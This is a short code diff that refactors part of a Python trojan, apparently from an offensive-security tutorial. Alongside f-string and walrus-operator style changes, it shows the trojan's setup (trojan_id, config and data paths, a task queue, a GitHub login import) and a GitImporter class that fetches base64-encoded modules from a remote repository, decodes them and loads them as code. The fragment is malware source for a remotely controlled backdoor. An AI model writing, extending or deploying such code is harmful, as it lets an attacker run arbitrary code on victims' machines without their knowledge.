@@ -10,8 +10,8 @@ import queue
 from github3 import login
 
 trojan_id = "abc"
-trojan_config = "config/{}.json".format(trojan_id)
-data_path = "data/{}/".format(trojan_id)
+trojan_config = f"config/{trojan_id}.json"
+data_path = f"data/{trojan_id}/"
 trojan_modules = []
 configured = False
 task_queue = queue.Queue()
@@ -23,8 +23,7 @@ class GitImporter(object):
     def find_module(self, fullname, path=None):
         if configured:
             print(f"[*] Attempting to retrieve {fullname}")
-            new_library = get_file_contents(f"modules/{fullname}")
-            if new_library:
+            if new_library := get_file_contents(f"modules/{fullname}"):
                 self.current_module_code = base64.b64decode(new_library)
                 return self
         return None
